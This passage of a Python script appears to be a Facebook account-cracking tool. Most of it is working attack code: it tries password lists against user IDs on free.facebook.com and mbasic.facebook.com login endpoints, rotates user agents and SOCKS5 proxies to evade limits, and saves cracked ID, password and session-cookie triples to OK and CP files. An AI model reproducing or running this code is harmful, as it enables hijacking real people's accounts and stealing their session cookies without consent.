			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=113869198637480&kid_directed_site=0&app_id=113869198637480&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D113869198637480%26auth_type%26cbt%3D1661472092987%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df105a73f6454cdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener%26client_id%3D113869198637480%26display%3Dtouch%26domain%3Ddevelopers.facebook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Fdocs%252Ffacebook-login%252Fweb%252Flogin-button%26force_confirmation%3Dfalse%26id%3Df645772e438a8%26locale%3Did_ID%26logger_id%3D156a3104-7770-45c9-a62a-bff441a03e49%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ce1f45a7b6fdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener.parent%2526frame%253Df645772e438a8%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26tp_config_id%26url%3Ddialog%252Foauth%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1661472095&hrc=1&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{M}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{U}{kuki}{U}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-MBASIC ]-----------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bo,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=113869198637480&kid_directed_site=0&app_id=113869198637480&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D113869198637480%26auth_type%26cbt%3D1661472092987%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df105a73f6454cdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener%26client_id%3D113869198637480%26display%3Dtouch%26domain%3Ddevelopers.facebook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Fdocs%252Ffacebook-login%252Fweb%252Flogin-button%26force_confirmation%3Dfalse%26id%3Df645772e438a8%26locale%3Did_ID%26logger_id%3D156a3104-7770-45c9-a62a-bff441a03e49%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ce1f45a7b6fdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener.parent%2526frame%253Df645772e438a8%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26tp_config_id%26url%3Ddialog%252Foauth%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1661472095&hrc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v14.0/dialog/oauth?app_id=113869198637480&auth_type&cbt=1661472092987&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df105a73f6454cdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener&client_id=113869198637480&display=touch&domain=developers.facebook.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button&force_confirmation=false&id=f645772e438a8&locale=id_ID&logger_id=156a3104-7770-45c9-a62a-bff441a03e49&messenger_page_id&origin=2&plugin_prepare=true&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8&ref=LoginButton&reset_messenger_state=false&response_type=signed_request%2Ctoken%2Cgraph_domain&scope&sdk=joey&size=%7B%22width%22%3Anull%2C%22height%22%3Anull%7D&tp_config_id&url=dialog%2Foauth&version=v14.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=113869198637480&kid_directed_site=0&app_id=113869198637480&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D113869198637480%26auth_type%26cbt%3D1661472092987%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df105a73f6454cdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener%26client_id%3D113869198637480%26display%3Dtouch%26domain%3Ddevelopers.facebook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Fdocs%252Ffacebook-login%252Fweb%252Flogin-button%26force_confirmation%3Dfalse%26id%3Df645772e438a8%26locale%3Did_ID%26logger_id%3D156a3104-7770-45c9-a62a-bff441a03e49%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ce1f45a7b6fdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener.parent%2526frame%253Df645772e438a8%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26tp_config_id%26url%3Ddialog%252Foauth%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified%26_rdr&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} * --> {x}{M}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} * --> {H}{idf}|{pw}')
				print(f'\r{x} * --> {x}{U}{kuki}{U}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> BY SIDIK.GANZ<<<<<#
